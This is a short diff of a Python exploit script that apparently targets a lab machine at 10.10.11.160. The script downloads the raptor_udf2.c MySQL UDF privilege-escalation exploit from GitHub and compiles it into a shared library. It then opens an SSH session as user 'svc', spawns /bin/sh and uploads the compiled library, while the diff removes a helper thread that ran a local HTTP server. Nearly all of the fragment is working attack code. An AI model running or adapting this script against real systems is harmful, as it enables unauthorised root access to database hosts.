@@ -44,11 +44,6 @@ wget("https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c",
 os.system("gcc -g -c raptor_udf2.c")
 os.system("gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc")
 
-def server():
-    os.system("python3 -m http.server 8000")
-
-threading.Thread(target=server, args=()).start()
-
 request = ssh(host='10.10.11.160', user='svc', keyfile='key')
 shell = request.process("/bin/sh")
 request.upload("raptor_udf2.so")
